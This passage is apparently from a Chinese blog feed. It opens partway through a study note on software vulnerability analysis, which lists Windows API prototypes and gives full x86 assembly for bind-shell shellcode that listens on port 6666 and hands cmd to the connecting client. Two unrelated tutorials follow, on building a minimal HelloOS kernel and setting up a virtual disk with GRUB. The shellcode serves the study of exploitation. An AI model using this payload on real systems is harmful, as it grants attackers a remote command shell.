LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandles,                      <span class="comment">// handle inheritance option</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                     <span class="comment">// creation flags</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpEnvironment,                      <span class="comment">// new environment block</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ExitProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  UINT uExitCode   <span class="comment">// exit code for all threads</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ws2_32.dll</code> 中的导出函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAStartup</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  WORD wVersionRequested,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPWSADATA lpWSAData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">WSAData</span> &#123;</span><br><span class="line">  WORD                  wVersion;</span><br><span class="line">  WORD                  wHighVersion;</span><br><span class="line">  <span class="type">char</span>                  szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">  <span class="type">char</span>                  szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span>        iMaxSockets;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span>        iMaxUdpDg;</span><br><span class="line">  <span class="type">char</span> FAR *            lpVendorInfo;</span><br><span class="line">&#125; WSADATA, *LPWSADATA; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">SOCKET <span class="title">WSASocketA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> af,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> type,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPWSAPROTOCOL_INFO lpProtocolInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  GROUP g,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFlags</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  SOCKET s,                          </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">const</span> <span class="keyword">struct</span> sockaddr FAR *name,   </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> namelen                        </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span> &#123;</span><br><span class="line">  u_short    sa_family;</span><br><span class="line">  <span class="type">char</span>       sa_data[<span class="number">14</span>];</span><br><span class="line">&#125;;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line">        <span class="type">short</span>   sin_family;</span><br><span class="line">        u_short sin_port;</span><br><span class="line">        <span class="keyword">struct</span>  <span class="title class_">in_addr</span> sin_addr;</span><br><span class="line">        <span class="type">char</span>    sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  SOCKET s,    </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> backlog  </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">SOCKET <span class="title">accept</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  SOCKET s,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">struct</span> sockaddr FAR *addr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">int</span> FAR *addrlen</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  nop</span><br><span class="line">  nop</span><br><span class="line">  nop</span><br><span class="line">; start of shellcode </span><br><span class="line">; assume: eax points here </span><br><span class="line">; function hashes (executable as nop-equivalent) </span><br><span class="line">  _emit 0x59	; LoadLibraryA ; pop ecx </span><br><span class="line">  _emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 </span><br><span class="line">  _emit 0xc9 	; ExitProcess </span><br><span class="line">  _emit 0xd3 	; WSAStartup </span><br><span class="line">  _emit 0x62 	; WSASocketA </span><br><span class="line">  _emit 0x30 	; bind </span><br><span class="line">  _emit 0x20 	; listen </span><br><span class="line">  _emit 0x41 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">; &quot;CMd&quot; </span><br><span class="line">  _emit 0x43 	; inc ebx </span><br><span class="line">  _emit 0x4d 	; dec ebp </span><br><span class="line">  _emit 0x64 	; FS: </span><br><span class="line"></span><br><span class="line">; start of proper code </span><br><span class="line">  cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">  xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">  lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">              ; addresses (last addr will be written just </span><br><span class="line">              ; before &quot;cmd&quot;) </span><br><span class="line">  </span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">  mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">  mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">  mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">  mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">  mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br><span class="line">  </span><br><span class="line">; make some stack space </span><br><span class="line">  mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">  sub esp, edx </span><br><span class="line">  </span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">  mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">  push edx </span><br><span class="line">  push 0x5f327377 </span><br><span class="line">  push esp </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">find_lib_functions: </span><br><span class="line">  lodsb 					; load next hash into al and increment esi </span><br><span class="line">  cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">              ; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">  jne find_functions </span><br><span class="line">  xchg eax, ebp 			; save current hash </span><br><span class="line">  call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">  xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">              ; with base address of ws2_32.dll </span><br><span class="line">  push edi 					; save location of addr of first winsock function </span><br><span class="line">  </span><br><span class="line">find_functions: </span><br><span class="line">  pushad 						; preserve registers </span><br><span class="line">  mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">  mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">  add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">  mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">  add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">  xor edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">next_function_loop: </span><br><span class="line">  inc edi 					; increment function counter </span><br><span class="line">  mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">  add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">  cdq 						; dl will hold hash (we know eax is small) </span><br><span class="line">  </span><br><span class="line">hash_loop: </span><br><span class="line">  lodsb 					; load next char into al and increment esi </span><br><span class="line">  xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">  sub dl, al 				; update hash with current char </span><br><span class="line">  cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">  jne hash_loop </span><br><span class="line">  cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">  jnz next_function_loop </span><br><span class="line">  </span><br><span class="line">                ; we now have the right function </span><br><span class="line">  </span><br><span class="line">  mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">  add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">  mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function </span><br><span class="line">  mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">  add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">  add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">                ; relative offset of matched function </span><br><span class="line">  xchg eax, ebp 				; move func addr into eax </span><br><span class="line">  pop edi 					; edi is last onto stack in pushad </span><br><span class="line">  stosd 					; write function addr to [edi] and increment edi </span><br><span class="line">  push edi </span><br><span class="line">  popad					; restore registers </span><br><span class="line">  cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">  jne find_lib_functions </span><br><span class="line">  pop esi 					; saved location of first winsock function </span><br><span class="line">                ; we will lodsd and call each func in sequence </span><br><span class="line">  </span><br><span class="line">; initialize winsock </span><br><span class="line">  </span><br><span class="line">  push esp 					; use stack for WSADATA </span><br><span class="line">  push 0x02 				; wVersionRequested </span><br><span class="line">  lodsd </span><br><span class="line">  call eax 					; WSAStartup </span><br><span class="line">  </span><br><span class="line">; null-terminate &quot;cmd&quot; </span><br><span class="line">  mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked </span><br><span class="line">  </span><br><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">  lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, </span><br><span class="line">  mov edi, esp </span><br><span class="line">  rep stosd 				; eax is still 0 </span><br><span class="line"></span><br><span class="line">; create socket </span><br><span class="line">  inc eax </span><br><span class="line">  push eax					; type = 1 (SOCK_STREAM) </span><br><span class="line">  inc eax </span><br><span class="line">  push eax ; af = 2 (AF_INET) </span><br><span class="line">  lodsd </span><br><span class="line">  call eax ; WSASocketA </span><br><span class="line">  xchg ebp, eax				; save SOCKET descriptor in ebp (safe from </span><br><span class="line">                ; being changed by remaining API calls) </span><br><span class="line">  </span><br><span class="line">; push bind parameters </span><br><span class="line">  mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET </span><br><span class="line">  xor ah, ah					; remove the ff from eax </span><br><span class="line">  push eax	 				; we use 0x0a1a0002 as both the name (struct </span><br><span class="line">                ; sockaddr) and namelen (which only needs to </span><br><span class="line">                ; be large enough) </span><br><span class="line">  push esp 					; pointer to our sockaddr struct </span><br><span class="line">  </span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">  push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">                ; NULL for all other params) </span><br><span class="line">  lodsd </span><br><span class="line">  call eax 					; call the next function </span><br><span class="line">  test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">                ; returns a SOCKET descriptor </span><br><span class="line">  jz call_loop </span><br><span class="line">  </span><br><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">  inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">  sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">  stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">              ; (still in eax) as the stdin handle </span><br><span class="line">  stosd 					; same for stdout </span><br><span class="line">  stosd					; same for stderr (optional) </span><br><span class="line">  </span><br><span class="line">; create process </span><br><span class="line">  pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) </span><br><span class="line">  push esp			; use stack as PROCESSINFORMATION structure </span><br><span class="line">  ; (STARTUPINFO now back to esp) </span><br><span class="line">  push esp 			; STARTUPINFO structure </span><br><span class="line">  push eax 		; lpCurrentDirectory = NULL </span><br><span class="line">  push eax 		; lpEnvironment = NULL </span><br><span class="line">  push eax 		; dwCreationFlags = NULL </span><br><span class="line">  push esp 			; bInheritHandles = true </span><br><span class="line">  push eax 		; lpThreadAttributes = NULL </span><br><span class="line">  push eax 		; lpProcessAttributes = NULL </span><br><span class="line">  push esi 			; lpCommandLine = &quot;cmd&quot; </span><br><span class="line">  push eax 		; lpApplicationName = NULL </span><br><span class="line">  call [esi - 0x1c] 	; CreateProcessA </span><br><span class="line">  </span><br><span class="line">; call ExitProcess() </span><br><span class="line">  call [esi - 0x18] ; ExitProcess</span><br><span class="line">  nop</span><br><span class="line">  nop</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>0day安全：软件漏洞分析技术</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战01-实现一个最简单的内核</title>
    <url>/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<h1 id="HelloOS"><a href="#HelloOS" class="headerlink" title="HelloOS"></a>HelloOS</h1><p>这里所有的测试环境都在 Ubuntu18.04 虚拟机中。</p>
<h2 id="HelloOS-构成"><a href="#HelloOS-构成" class="headerlink" title="HelloOS 构成"></a>HelloOS 构成</h2><p>这里使用的是第二讲的<a href="https://github.com/CKCat/learnOS/tree/master/lesson02/HelloOS">代码</a>，代码结构如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  HelloOS tree</span><br><span class="line">.</span><br><span class="line">├── entry.asm</span><br><span class="line">├── floppy.img</span><br><span class="line">├── hello.lds</span><br><span class="line">├── main.c</span><br><span class="line">├── Makefile</span><br><span class="line">├── vgastr.c</span><br><span class="line">└── vgastr.h</span><br></pre></td></tr></table></figure>
<ul>
<li><code>entry.asm</code> 为供 grub 调用的引导程序，用于设置 CPU 工作模式与工作环境，并调用 C 语言编写的 main 函数。</li>
<li><code>main.c</code> 实现 main 函数，此处用于打印字符串。</li>
<li><code>vgastr.c / vgastr.h</code> 实现字符串在显示器上的输出。</li>
<li><code>hello.lds</code> 链接器脚本，用于指导链接过程，设定不同程序段的布局。</li>
<li><code>Makefile</code> 编译脚本，用于指导编译过程。</li>
<li><code>floppy.img</code> 用于 qemu 启动。</li>
</ul>
<p>关于输出字符串的函数需要说明一下：</p>
<ol>
<li>写入字符 ASCII 码的目标地址为 0xb8000 起始的内存，映射到该地址的是显卡字符模式下的显存。</li>
<li>每显示一个字符将 p_strdst + 2 ，是因为显存中每个字符对应 2 字节，分别为字符编码和字符显示属性。</li>
</ol>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/%E5%AD%97%E7%AC%A6%E6%A8%A1%E5%BC%8F.png" class="">

<h2 id="HelloOS-编译"><a href="#HelloOS-编译" class="headerlink" title="HelloOS 编译"></a>HelloOS 编译</h2><p>HelloOS编译过程如下图所示。</p>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" class="">

<p>首先安装编译源码需要的工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc         <span class="comment"># 编译器</span></span><br><span class="line">sudo apt install make        <span class="comment"># 自动化构建工具        </span></span><br><span class="line">sudo apt-get install nasm    <span class="comment"># 汇编工具</span></span><br></pre></td></tr></table></figure>
<p>安装好相关环境后，直接在源码目录执行 make 命令即可，编译完成后的目录结构。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  HelloOS tree</span><br><span class="line">.</span><br><span class="line">├── entry.asm</span><br><span class="line">├── entry.o</span><br><span class="line">├── floppy.img</span><br><span class="line">├── hello.lds</span><br><span class="line">├── HelloOS.bin</span><br><span class="line">├── HelloOS.elf</span><br><span class="line">├── HelloOS.map</span><br><span class="line">├── main.c</span><br><span class="line">├── main.o</span><br><span class="line">├── Makefile</span><br><span class="line">├── vgastr.c</span><br><span class="line">├── vgastr.h</span><br><span class="line">└── vgastr.o</span><br></pre></td></tr></table></figure>
<p><code>HelloOS.elf、HelloOS.bin</code> 为编译的最终产物，即我们的“操作系统”。<br><code>HelloOS.map</code> 为链接过程中，生成链接布局文件，通过该文件可知 HelloOS 的内存映射布局。<br><code>main.o、vgastr.o、entry.o</code> 为可链接的二进制程序。</p>
<h1 id="安装-HelloOS"><a href="#安装-HelloOS" class="headerlink" title="安装 HelloOS"></a>安装 HelloOS</h1><h2 id="使用-qemu-安装"><a href="#使用-qemu-安装" class="headerlink" title="使用 qemu 安装"></a>使用 qemu 安装</h2><p>安装 qemu 环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu        <span class="comment"># qemu 模拟器</span></span><br></pre></td></tr></table></figure>
<p>相关的环境配置都已经写在 Makefile 文件中，这里只需要在源码目录下执行 make 命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  HelloOS make update_image    <span class="comment"># 需要输入用户密码</span></span><br></pre></td></tr></table></figure>
<p>最后执行 make qemu 命令，qemu 将加载我“操作系统”，在屏幕上输出 Hello OS!</p>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/qemu.png" class="">

<h2 id="使用-Grub"><a href="#使用-Grub" class="headerlink" title="使用 Grub"></a>使用 Grub</h2><p>这里直接使用 Grub Customizer 工具修改 Grub 设置。</p>
<p>安装 Grub Customizer </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo add-apt-repository ppa:danielrichter2007/grub-customizer</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install grub-customizer</span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">sudo apt-get remove --autoremove grub-customizer</span><br></pre></td></tr></table></figure>

<p>将我们编译的系统移动到 boot 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  HelloOS sudo <span class="built_in">cp</span> HelloOS.bin /boot </span><br></pre></td></tr></table></figure>

<p>启动Grub Customizer，新增一个 Grub 配置，如下图所示。</p>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/Grub%E9%85%8D%E7%BD%AE.png" class="">

<p>设置 grub 引导菜单，如下图所示：</p>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/Grub%E5%BC%95%E5%AF%BC%E8%8F%9C%E5%8D%95%E8%AE%BE%E7%BD%AE.png" class="">

<p>修改成功后，重启系统将出现下图所示的界面，然后选中 HelloOS 即可启动我们自己的系统。</p>
<img src="/2021/10/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9801-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/Grub%E5%90%AF%E5%8A%A8%E8%8F%9C%E5%8D%95.png" class="">

<p>下面为新增的 Grub 配置信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod part_msdos <span class="comment">#GRUB加载分区模块识别分区</span></span><br><span class="line">insmod ext2 <span class="comment">#GRUB加载ext文件系统模块识别ext文件系统</span></span><br><span class="line"><span class="built_in">set</span> root=<span class="string">&#x27;hd0,msdos4&#x27;</span> <span class="comment">#注意boot目录挂载的分区，这是我机器上的情况</span></span><br><span class="line">multiboot2 /boot/HelloOS.bin <span class="comment">#GRUB以multiboot2协议加载HelloOS.bin</span></span><br><span class="line">boot <span class="comment">#GRUB启动HelloOS.bin</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>set root=&#39;hd0,msdos1&#39;</code> 需要根据自己的实际情况设置。一般可以通过 <code>df /boot/</code> 查看 boot 目录挂载的分区。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">df</span> /boot/                   </span><br><span class="line">Filesystem     1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/sda1       20509264 8205604  11238804  43% /</span><br></pre></td></tr></table></figure>
<p>这里 <code>sda1</code> 表示硬盘的第一分区，在 Grub 中需要写成 <code>hd0,msdos1</code>,表示第一块硬盘的第一个分区。如果是其他硬盘的其他分区，则需要根据实际情况进行改写。例如第一个硬盘的第四个分区则应该这样写 <code>hd0,msdos4</code>，更多的细节可以自行了解。</p>
]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战02-设置工作模式与环境</title>
    <url>/2021/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9802-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="建立虚拟电脑"><a href="#建立虚拟电脑" class="headerlink" title="建立虚拟电脑"></a>建立虚拟电脑</h1><p>首先允许硬件虚拟化，选中 ubuntu18.04 虚拟机，虚拟机设置-&gt;硬件-&gt;处理器-&gt;虚拟化引擎，这里一般会有三个选项，全都勾上即可。</p>
<p>然后直接在 ubuntu18.04 的 Ubuntu Software 应用中搜索并安装 VirtualBox（版本号为 5.2.42），然后启动它，新建一个虚拟机，设置如下图所示。</p>
<img src="/2021/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9802-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA.png" class="">


<h2 id="生产虚拟硬盘"><a href="#生产虚拟硬盘" class="headerlink" title="生产虚拟硬盘"></a>生产虚拟硬盘</h2><h3 id="创建一个-100MB-的空文件"><a href="#创建一个-100MB-的空文件" class="headerlink" title="创建一个 100MB 的空文件"></a>创建一个 100MB 的空文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">dd</span> bs=512 <span class="keyword">if</span>=/dev/zero of=hd.img count=204800</span><br><span class="line">204800+0 records <span class="keyword">in</span></span><br><span class="line">204800+0 records out</span><br><span class="line">104857600 bytes (105 MB, 100 MiB) copied, 0.857703 s, 122 MB/s</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li>bs : 表示块大小，这里是 512 字节。</li>
<li>if : 表示输入文件，<code>/dev/zero</code> 就是 Linux 下专门返回 0 数据的设备文件，读取它就返回 0。</li>
<li>of : 表示输出文件，即我们的硬盘文件。</li>
<li>count : 表示输出多少块。</li>
</ul>
<h3 id="格式化虚拟硬盘"><a href="#格式化虚拟硬盘" class="headerlink" title="格式化虚拟硬盘"></a>格式化虚拟硬盘</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo losetup /dev/loop0 hd.img</span><br><span class="line">losetup: hd.img: failed to <span class="built_in">set</span> up loop device: Device or resource busy</span><br></pre></td></tr></table></figure>
<p>直接使用回环设备 <code>/dev/loop0</code> 可能会出错，此时不要慌，直接复制错误信息搜索相关的问题，上面的错误表明 <code>/dev/loop0</code> 正在使用中，可以用下面方法解决。</p>
<p>使用 <code>df -h</code> 查看 <code>/dev/loop#</code> 所有被挂载的回环设备，我们选择一个没有挂载的 <code>/dev/loop#</code> 回环设备即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">df</span> -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs           391M  2.1M  389M   1% /run</span><br><span class="line">/dev/sda1        20G  8.1G   11G  44% /</span><br><span class="line">tmpfs           2.0G   26M  1.9G   2% /dev/shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M   1% /run/lock</span><br><span class="line">tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup</span><br><span class="line">/dev/loop0      2.7M  2.7M     0 100% /snap/gnome-system-monitor/169</span><br><span class="line">/dev/loop2       62M   62M     0 100% /snap/core20/1169</span><br><span class="line">/dev/loop1       33M   33M     0 100% /snap/snapd/13640</span><br><span class="line">/dev/loop3      2.5M  2.5M     0 100% /snap/gnome-calculator/748</span><br><span class="line">/dev/loop4       33M   33M     0 100% /snap/snapd/13270</span><br><span class="line">/dev/loop5       56M   56M     0 100% /snap/core18/1885</span><br><span class="line">/dev/loop6      384K  384K     0 100% /snap/gnome-characters/550</span><br><span class="line">/dev/loop7      768K  768K     0 100% /snap/gnome-characters/726</span><br><span class="line">/dev/loop8      1.0M  1.0M     0 100% /snap/gnome-logs/100</span><br><span class="line">/dev/loop9       66M   66M     0 100% /snap/gtk-common-themes/1519</span><br><span class="line">/dev/loop10      56M   56M     0 100% /snap/core18/2128</span><br><span class="line">/dev/loop11     243M  243M     0 100% /snap/gnome-3-38-2004/76</span><br><span class="line">/dev/loop12     256M  256M     0 100% /snap/gnome-3-34-1804/36</span><br><span class="line">/dev/loop13     640K  640K     0 100% /snap/gnome-logs/106</span><br><span class="line">/dev/loop14      63M   63M     0 100% /snap/gtk-common-themes/1506</span><br><span class="line">/dev/loop16     128K  128K     0 100% /snap/bare/5</span><br><span class="line">/dev/loop15     2.5M  2.5M     0 100% /snap/gnome-calculator/884</span><br><span class="line">/dev/loop17     219M  219M     0 100% /snap/gnome-3-34-1804/72</span><br><span class="line">/dev/loop18     2.5M  2.5M     0 100% /snap/gnome-system-monitor/163</span><br><span class="line">tmpfs           391M   16K  391M   1% /run/user/121</span><br><span class="line">tmpfs           391M   28K  391M   1% /run/user/1000</span><br></pre></td></tr></table></figure>
<p>可以发现 0~18 相关的回环设备都被使用了，那么我们直接使用第 19 个回环设备 <code>/dev/loop19</code> 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo losetup /dev/loop19 hd.img</span><br></pre></td></tr></table></figure>

<h3 id="格式化并挂载回环设备"><a href="#格式化并挂载回环设备" class="headerlink" title="格式化并挂载回环设备"></a>格式化并挂载回环设备</h3><p>使用 <code>mkfs.ext4</code> 命令格式化这个 <code>/dev/loop19</code> 回环块设备。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo mkfs.ext4 -q /dev/loop19</span><br></pre></td></tr></table></figure>

<p>事先建立 hdisk 目录，并在其中建立一个 boot 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">mkdir</span> hdisk</span><br><span class="line">➜  ~ <span class="built_in">mkdir</span> hdisk/boot</span><br></pre></td></tr></table></figure>

<p>使用 mount 命令挂载硬盘文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo mount -o loop ./hd.img ./hdisk/</span><br></pre></td></tr></table></figure>

<h3 id="安装-GRUB"><a href="#安装-GRUB" class="headerlink" title="安装 GRUB"></a>安装 GRUB</h3><p>安装 GRUB 之前需要挂载虚拟硬盘文件为回环设备，即前面的那些操作。</p>
